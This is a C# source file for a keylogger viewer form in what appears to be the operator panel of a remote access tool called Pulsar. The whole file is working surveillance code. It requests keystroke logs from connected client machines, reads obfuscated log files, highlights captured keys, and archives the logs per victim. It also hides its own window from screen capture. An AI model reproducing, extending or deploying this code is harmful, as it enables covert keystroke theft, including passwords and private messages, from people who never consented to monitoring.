using Pulsar.Common.Helpers;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Monitoring.KeyLogger;
using Pulsar.Server.Forms.DarkMode;
using Pulsar.Server.Helper;
using Pulsar.Server.Messages;
using Pulsar.Server.Networking;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Pulsar.Server.Forms
{
    public partial class FrmKeylogger : Form
    {
        private readonly Client _connectClient;
        private readonly KeyloggerHandler _keyloggerHandler;
        private static readonly Dictionary<Client, FrmKeylogger> OpenedForms = new();
        private bool _isRefreshingLog = false;
        private readonly Timer _autoRefreshTimer = new();
        private readonly object _contentLock = new();
        private StringBuilder _currentLogCache = new();
        private DateTime _lastRefreshTime = DateTime.MinValue;
        private readonly TimeSpan _minimumRefreshInterval = TimeSpan.FromMilliseconds(1000);

        private FileSystemWatcher _fileWatcher;
        private string _currentWatchedFile;

        public static FrmKeylogger CreateNewOrGetExisting(Client client)
        {
            if (OpenedForms.TryGetValue(client, out var form)) return form;

            form = new FrmKeylogger(client);
            form.Disposed += (s, e) => OpenedForms.Remove(client);
            OpenedForms.Add(client, form);
            return form;
        }

        public FrmKeylogger(Client client)
        {
            _connectClient = client ?? throw new ArgumentNullException(nameof(client));
            _keyloggerHandler = new KeyloggerHandler(client);

            InitializeComponent();
            DarkModeManager.ApplyDarkMode(this);
            ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);

            RegisterMessageHandler();

            _autoRefreshTimer.Interval = 2000;
            _autoRefreshTimer.Tick += AutoRefreshTimer_Tick;

            InitializeFileWatcher();
        }

        private DateTime _lastWatcherEvent = DateTime.MinValue;
        private readonly TimeSpan _watcherCooldown = TimeSpan.FromMilliseconds(250);

        private void InitializeFileWatcher()
        {
            _fileWatcher = new FileSystemWatcher
            {
                Path = Path.GetTempPath(),
                Filter = "*.txt",
                // expanded to prevent missed/duplicate events
                NotifyFilter = NotifyFilters.LastWrite
                              | NotifyFilters.Size
                              | NotifyFilters.FileName
                              | NotifyFilters.CreationTime,
                EnableRaisingEvents = false,
                IncludeSubdirectories = false
            };

            // prevent “buffer overflow” events on fast updates
            _fileWatcher.InternalBufferSize = 64 * 1024;

            _fileWatcher.Changed += async (s, e) =>
            {
                if (e.FullPath != _currentWatchedFile)
                    return;

                var now = DateTime.UtcNow;

                // Prevent watcher spam when Windows fires multiple events for one write
                if (now - _lastWatcherEvent < _watcherCooldown)
                    return;

                _lastWatcherEvent = now;

                // Wait for the writing process to close its handle
                await Task.Delay(50);

                SafeInvoke(RefreshSelectedLog);
            };
        }


        private void AutoRefreshTimer_Tick(object sender, EventArgs e)
        {
            if ((DateTime.UtcNow - _lastRefreshTime) < _minimumRefreshInterval) return;
            _lastRefreshTime = DateTime.UtcNow;

            if (checkBox1.Checked && lstLogs.SelectedItems.Count > 0)
                RefreshSelectedLog();
        }

        private void RegisterMessageHandler()
        {
            _connectClient.ClientState += ClientDisconnected;
            _keyloggerHandler.ProgressChanged += LogsChanged;
            MessageHandler.Register(_keyloggerHandler);
        }

        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_keyloggerHandler);
            _keyloggerHandler.ProgressChanged -= LogsChanged;
            _connectClient.ClientState -= ClientDisconnected;
        }
        private void LogsChanged(object sender, string message)
        {
            var now = DateTime.UtcNow;

            if (now - _lastLogRefresh < _logRefreshCooldown)
                return; // ignore spam events

            _lastLogRefresh = now;

            SafeInvoke(RefreshLogsDirectory);
        }

        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected) SafeInvoke(Close);
        }

        private DateTime _lastLogRefresh = DateTime.MinValue;
        private readonly TimeSpan _logRefreshCooldown = TimeSpan.FromMilliseconds(500);  // tune as needed

        private void FrmKeylogger_Load(object sender, EventArgs e)
        {
            // Make fullscreen button always follow top-right corner
            button3.Anchor = AnchorStyles.Top | AnchorStyles.Right;
            // Center the image
            button3.ImageAlign = ContentAlignment.MiddleCenter;
            button3.Text = ""; // optional, removes any text

            // Resize the existing image to fit the button nicely
            if (button3.Image != null)
            {
                int newSize = Math.Min(button3.Width - 4, button3.Height - 4); // small padding
                Bitmap resized = new Bitmap(button3.Image, new Size(newSize, newSize));
                button3.Image = resized;
            }

            Text = WindowHelper.GetWindowTitle("Keylogger", _connectClient);
            RefreshLogsDirectory();

            if (lstLogs.Items.Count > 0)
            {
                lstLogs.Items[0].Selected = true;
                //lstLogs.Focus();
                UpdateFileWatcher();
                RefreshSelectedLog();
            }
        }

        private void FrmKeylogger_FormClosing(object sender, FormClosingEventArgs e)
        {
            UnregisterMessageHandler();
            _keyloggerHandler.Dispose();
            _fileWatcher?.Dispose();
            _autoRefreshTimer.Stop();
            _autoRefreshTimer.Dispose();
        }

        private void lstLogs_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (lstLogs.SelectedItems.Count > 0)
            {
                UpdateFileWatcher();
                RefreshSelectedLog();
            }
        }

        private void lstLogs_ItemActivate(object sender, EventArgs e) => RefreshSelectedLog();

        private void UpdateFileWatcher()
        {
            if (lstLogs.SelectedItems.Count > 0)
            {
                _currentWatchedFile = Path.Combine(Path.GetTempPath(), lstLogs.SelectedItems[0].Text);
                _fileWatcher.EnableRaisingEvents = checkBox1.Checked;
            }
            else
            {
                _fileWatcher.EnableRaisingEvents = false;
            }
        }

        private void RefreshLogsDirectory()
        {
            SafeInvoke(() =>
            {
                string previous = lstLogs.SelectedItems.Count > 0 ? lstLogs.SelectedItems[0].Text : null;
                lstLogs.Items.Clear();

                try
                {
                    var validPattern = new Regex(@"^\d{4}-\d{2}-\d{2}(?:_\d{2})?\.txt$");
                    var files = new DirectoryInfo(Path.GetTempPath())
                        .GetFiles("*.txt")
                        .Where(f => validPattern.IsMatch(f.Name))
                        .OrderByDescending(f => f.LastWriteTime);

                    foreach (var f in files)
                        lstLogs.Items.Add(new ListViewItem(f.Name));

                    if (!string.IsNullOrEmpty(previous))
                    {
                        var item = lstLogs.Items.Cast<ListViewItem>().FirstOrDefault(i => i.Text == previous);
                        if (item != null)
                        {
                            item.Selected = true;
                            // DO NOT call lstLogs.Focus() here
                        }
                    }
                    else if (lstLogs.Items.Count > 0)
                    {
                        lstLogs.Items[0].Selected = true;
                        // DO NOT call lstLogs.Focus() here
                    }

                    UpdateFileWatcher();
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Refresh logs error: {ex.Message}");
                }
            });
        }

        private void RefreshSelectedLog()
        {
            if (_isRefreshingLog) return;   // prevents overlapping refreshes
            if (lstLogs.SelectedItems.Count == 0) return;

            _isRefreshingLog = true;

            string logFile = Path.Combine(Path.GetTempPath(), lstLogs.SelectedItems[0].Text);

            Task.Run(async () =>
            {
                try
                {
                    if (!File.Exists(logFile))
                    {
                        SafeInvoke(() =>
                        {
                            rtbLogViewer.Text = "Log file not found.";
                            ForceScrollToBottom();
                        });

                        _isRefreshingLog = false;
                        return;
                    }

                    // Read with retry protection
                    string content = await ReadFileWithRetryAsync(logFile);
                    if (content == null)
                    {
                        _isRefreshingLog = false;
                        return;
                    }

                    // -----------------------------
                    // ⭐ FIX #5 IS RIGHT HERE ⭐
                    // -----------------------------
                    if (content == _currentLogCache.ToString())
                    {
                        SafeInvoke(ForceScrollToBottom);
                        _isRefreshingLog = false;
                        return;
                    }

                    // Heavy processing only if content changed
                    content = FilterAndDeduplicateLog(content);
                    content = MergeBrokenLines(content);
                    content = EnsureHeadersOnNewLine(content);


                    lock (_contentLock)
                    {
                        // Update cache
                        _currentLogCache.Clear();
                        _currentLogCache.Append(content);

                        SafeInvoke(() =>
                        {
                            // prevent flickering
                            rtbLogViewer.SuspendLayout();
                            rtbLogViewer.ReadOnly = true;

                            rtbLogViewer.Text = _currentLogCache.ToString();
                            HighlightSpecialKeys();

                            // scroll to bottom
                            rtbLogViewer.SelectionStart = rtbLogViewer.Text.Length;
                            rtbLogViewer.ScrollToCaret();
                            NativeMethods.SendMessage(
                                rtbLogViewer.Handle,
                                NativeMethods.WM_VSCROLL,
                                (IntPtr)NativeMethods.SB_BOTTOM,
                                IntPtr.Zero);

                            rtbLogViewer.ReadOnly = false;
                            rtbLogViewer.ResumeLayout();
                        });
                    }
                }
                catch (Exception ex)
                {
                    SafeInvoke(() =>
                    {
                        rtbLogViewer.Text = $"Error loading log: {ex.Message}";
                        ForceScrollToBottom();
                    });
                }
                finally
                {
                    _isRefreshingLog = false; // ALWAYS release lock
                }
            });
        }

        // Add this method to your form
        private void ForceScrollToBottom()
        {
            if (rtbLogViewer.IsDisposed || !rtbLogViewer.IsHandleCreated)
                return;

            rtbLogViewer.SelectionStart = rtbLogViewer.Text.Length;
            rtbLogViewer.ScrollToCaret();
            NativeMethods.SendMessage(rtbLogViewer.Handle, NativeMethods.WM_VSCROLL,
                (IntPtr)NativeMethods.SB_BOTTOM, IntPtr.Zero);
        }

        // Add this class inside your FrmKeylogger class
        private static class NativeMethods
        {
            public const int WM_VSCROLL = 0x0115;
            public const int SB_BOTTOM = 7;

            [System.Runtime.InteropServices.DllImport("user32.dll")]
            public static extern IntPtr SendMessage(IntPtr hWnd, int msg, IntPtr wp, IntPtr lp);
        }
        private async Task<string> ReadFileWithRetryAsync(string path, int maxRetries = 3)
        {
            for (int i = 0; i < maxRetries; i++)
            {
                try
                {
                    return await FileHelper.ReadObfuscatedLogFileAsync(path);
                }
                catch (IOException ex) when (i < maxRetries - 1)
                {
                    // Windows error code for "file is being used by another process"
                    const int ERROR_SHARING_VIOLATION = unchecked((int)0x80070020);
                    const int ERROR_LOCK_VIOLATION = unchecked((int)0x80070021);

                    // If the file is locked by writer, wait a moment then retry
                    if (ex.HResult == ERROR_SHARING_VIOLATION ||
                        ex.HResult == ERROR_LOCK_VIOLATION)
                    {
                        await Task.Delay(50);
                        continue;
                    }

                    // Other IOExceptions: still retry but delay a bit
                    await Task.Delay(50);
                }
                catch
                {
                    // Non-IO exceptions: no retry
                    break;
                }
            }

            return null; // failed after all retries
        }


        // ------------------ LOG PROCESSING ------------------

        private string FilterAndDeduplicateLog(string content)
        {
            if (string.IsNullOrEmpty(content)) return content;

            var lines = content.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
            var result = new List<string>();
            string lastLine = null;

            foreach (var line in lines)
            {
                string trimmed = Regex.Replace(line.Trim(), @"[ ]{2,}", " ");
                if (string.IsNullOrEmpty(trimmed)) continue;
                if (trimmed.StartsWith("Log created on") || trimmed.StartsWith("Session started at:") || trimmed.StartsWith("==="))
                    continue;

                if (trimmed != lastLine)
                {
                    result.Add(trimmed);
                    lastLine = trimmed;
                }
            }

            return string.Join(Environment.NewLine, result);
        }

        private string MergeBrokenLines(string content)
        {
            if (string.IsNullOrEmpty(content)) return content;

            var lines = content.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
            var merged = new List<string>();
            string currentHeader = null;
            StringBuilder textBuffer = new();

            foreach (var line in lines)
            {
                string trimmed = line.Trim();
                if (string.IsNullOrEmpty(trimmed)) continue;

                if (IsTimestampHeader(trimmed))
                {
                    if (currentHeader != null && textBuffer.Length > 0)
                    {
                        merged.Add(currentHeader);
                        merged.Add(textBuffer.ToString().Trim());
                        textBuffer.Clear();
                    }
                    currentHeader = trimmed;
                }
                else if (IsSpecialKey(trimmed))
                {
                    if (textBuffer.Length > 0)
                    {
                        merged.Add(currentHeader);
                        merged.Add(textBuffer.ToString().Trim());
                        textBuffer.Clear();
                    }
                    merged.Add(currentHeader);
                    merged.Add(trimmed);
                }
                else
                {
                    if (textBuffer.Length > 0) textBuffer.Append(" ");
                    textBuffer.Append(trimmed);
                }
            }

            if (currentHeader != null)
            {
                if (textBuffer.Length > 0) merged.Add(currentHeader);
                merged.Add(textBuffer.ToString().Trim());
            }

            return string.Join(Environment.NewLine, merged);
        }

        private bool IsTimestampHeader(string line)
            => Regex.IsMatch(line, @"^\[\d{1,2}:\d{2}:\d{2}(?:\s?[AP]M)?\].*");

        private bool IsSpecialKey(string text)
        {
            if (Regex.IsMatch(text, @"^\[[^\]]+\]$")) return true;
            return text.StartsWith("[") && text.Contains("]") &&
                   !IsTimestampHeader(text) &&
                   (text.Contains("[Back]") || text.Contains("[Shift]") || text.Contains("[Enter]") ||
                    text.Contains("[Tab]") || text.Contains("[Esc]") || text.Contains("[Ctrl]"));
        }

        private string EnsureHeadersOnNewLine(string content)
        {
            if (string.IsNullOrEmpty(content)) return content;
            return Regex.Replace(content, @"(?<!\n)(\[\d{1,2}:\d{2}:\d{2}(?:\s?[AP]M)?\])", "\r\n$1");
        }

        private void HighlightSpecialKeys()
        {
            string text = rtbLogViewer.Text;
            rtbLogViewer.SuspendLayout();

            var headerRegex = new Regex(@"\[\d{1,2}:\d{2}:\d{2}(?:\s?[AP]M)?\].*", RegexOptions.Multiline);
            foreach (Match match in headerRegex.Matches(text))
            {
                rtbLogViewer.Select(match.Index, match.Length);
                rtbLogViewer.SelectionColor = Color.DodgerBlue;  // ← better for light + dark
            }


            var specialKeyRegex = new Regex(@"\[[^\]]+\]");
            foreach (Match match in specialKeyRegex.Matches(text))
            {
                if (headerRegex.Matches(text).Cast<Match>().Any(h => match.Index >= h.Index && match.Index < h.Index + h.Length))
                    continue;

                rtbLogViewer.Select(match.Index, match.Length);
                rtbLogViewer.SelectionColor = Color.OrangeRed;   // ★ better contrast for light mode
            }


            rtbLogViewer.SelectionStart = rtbLogViewer.Text.Length;
            rtbLogViewer.SelectionColor = rtbLogViewer.ForeColor;
            rtbLogViewer.ResumeLayout();
        }

        private void SafeInvoke(Action action)
        {
            if (InvokeRequired) Invoke(action);
            else action();
        }

        // ---------------- UI button handlers ----------------
        private void button1_Click(object sender, EventArgs e) => _connectClient.Send(new GetKeyloggerLogsDirectory());
        private void btnGetLogs_Click(object sender, EventArgs e) => checkBox1_CheckedChanged_1(sender, e);

        private void checkBox1_CheckedChanged_1(object sender, EventArgs e)
        {
            if (checkBox1.Checked)
            {
                RefreshLogsDirectory();
                if (lstLogs.Items.Count > 0)
                {
                    lstLogs.Items[0].Selected = true;
                    //lstLogs.Focus();
                    UpdateFileWatcher();
                    RefreshSelectedLog();
                }
                _autoRefreshTimer.Start();
                _fileWatcher.EnableRaisingEvents = checkBox1.Checked && lstLogs.SelectedItems.Count > 0;
            }
            else
            {
                _autoRefreshTimer.Stop();
                _fileWatcher.EnableRaisingEvents = false;
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            try
            {
                if (_currentLogCache.Length == 0)
                {
                    MessageBox.Show("No log to save.");
                    return;
                }

                string clientFolder = string.IsNullOrWhiteSpace(_connectClient.Value.DownloadDirectory)
                    ? Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Clients", "UnknownClient")
                    : _connectClient.Value.DownloadDirectory;

                string saveDir = Path.Combine(clientFolder, "Keylogs");
                Directory.CreateDirectory(saveDir);

                string savePath = Path.Combine(saveDir, $"Keylog_{DateTime.Now:yyyy-MM-dd_HH-mm-ss}.txt");
                File.WriteAllText(savePath, _currentLogCache.ToString(), Encoding.UTF8);

                MessageBox.Show($"Log saved to {savePath}");
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to save log: {ex.Message}");
            }
        }

        //toggle full screen
        private bool _isFullscreen = false;
        private Rectangle _originalTextboxBounds;
        private DockStyle _originalDock;
        private AnchorStyles _originalAnchor;
        private List<Control> _hiddenControls = new();

        private void button3_Click(object sender, EventArgs e)
        {
            if (!_isFullscreen)
            {
                // Save original layout
                _originalTextboxBounds = rtbLogViewer.Bounds;
                _originalAnchor = rtbLogViewer.Anchor;

                // Anchor the button to Top|Right so it stays in place
                button3.Anchor = AnchorStyles.Top | AnchorStyles.Right;

                // Hide all other controls except textbox + toggle button
                _hiddenControls = Controls.Cast<Control>()
                                          .Where(c => c != rtbLogViewer && c != button3)
                                          .ToList();
                foreach (var c in _hiddenControls)
                    c.Visible = false;

                // Make textbox fill FULL form area
                rtbLogViewer.Dock = DockStyle.Fill;

                button3.BringToFront();
                _isFullscreen = true;
            }
            else
            {
                // Restore hidden controls
                foreach (var c in _hiddenControls)
                    c.Visible = true;

                // REMOVE Dock fill
                rtbLogViewer.Dock = DockStyle.None;

                // Restore original bounds + anchor exactly how it was before
                rtbLogViewer.Bounds = _originalTextboxBounds;
                rtbLogViewer.Anchor = _originalAnchor;

                // Keep the toggle button anchored top-right in normal mode
                button3.Anchor = AnchorStyles.Top | AnchorStyles.Right;

                _isFullscreen = false;
            }
        }

    }
}
